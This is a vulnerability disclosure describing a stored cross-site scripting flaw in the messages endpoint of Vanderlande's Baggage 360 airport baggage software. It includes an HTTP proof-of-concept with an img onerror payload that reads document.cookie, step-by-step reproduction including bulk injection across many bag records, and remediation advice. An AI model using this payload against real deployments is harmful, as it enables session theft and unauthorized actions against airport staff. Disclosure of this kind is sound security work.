# Vanderlande OpenAIR Baggage 360 Vulnerability - Stored Cross-Site Scripting (XSS)

**Exploit Title:** Stored XSS in Messages enables cross-user script execution  
**Exploit Author:** Yasser Alshammari (YasserREED)  
**Vendor Homepage:** https://www.vanderlande.com/  
**Product Page:** https://www.vanderlande.com/software/baggage-360/  
**Version:** Observed on **Baggage 360 v7.0.0** (earlier versions may be affected)  
**Tested On:** Web application (OpenAIR platform), authenticated user context  
**CVE:** Reported via VulDB, pending assignment  
**Severity:** **High 7.1** 

**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N`  

## Description

The endpoint **`POST /api-addons/v1/messages`** in **Vanderlande OpenAIR Baggage 360** accepts HTML in the `message` field, **stores** it, and later **renders** it **without escaping** in the UI. When a user opens **Bags → [select bag tag] → Interterm Bag Journey Details → Messages**, the injected JavaScript executes in the application context.

Because the **Bags** screen supports **bulk selection** and **Add Message**, a single request can attach the malicious content to **many bag tags at once**, causing wide impact across users who view those bag journeys.

### HTTP Proof of Concept (PoC)
```http
POST /api-addons/v1/messages HTTP/2
Host: example.com
Content-Type: application/json
Cookie: <Cookie Session>


{
  "messageObjects": [
    {
      "message": "<p><img src=x onerror=alert(document.cookie)></p>", // <== Add XSS payload here
      "type": "BAG",
      "messageType": "FREE_FORM",
      "entityId": "<bag-id>"
    }
  ]
}
```

### Affected Endpoint

POST `/api-addons/v1/messages` (message creation)

### Steps to Reproduce

1. Sign in with a user who can view bag details.
2. Navigate to Bags → [bag tag] → Interterm Bag Journey Details → Messages.
3. Start adding a message (type any text) and intercept the request (e.g., via a proxy).
4. Replace the message body with an XSS payload inside `<p>` tags, e.g. `<p><img src=x onerror=alert(document.cookie)></p>`.
5. Forward/submit the request.
6. Open the affected bag’s Messages section (with any user).
7. The payload executes in the browser, confirming stored XSS..

> Optional (wider impact): From Bags, select multiple bag tags → `Add Message` with the same payload → the script is attached to all selected records in one request.

## Impact
- **Code execution:** JavaScript runs in the app context when users view affected bag messages.
- **Data exposure:** Read DOM data; if cookies aren’t `HttpOnly`, `document.cookie` theft is possible.
- **Unauthorized actions:** Script can trigger privileged UI flows as the victim.
- **Widespread effect:** Bulk “Add Message” lets one payload hit many bag records at once.

## Remediation

- **Remove JavaScript entry points:** Strip all `on*` events from every element. For `<img>`, allow only `src` (http/https) and `alt`. **reject** `data:`/`javascript:` URLs.
- **Block malicious HTML:** Drop `script`, `iframe`, `svg`, `math`, `object`, `embed` and any unknown tags/attrs that can execute JavaScript.
- **Encode & verify:** HTML-escape on render and apply the same sanitization to bulk `Add Message`. Add tests to ensure `<img onerror>`, `<svg onload>`, and `<a href="javascript:...">` are neutralized.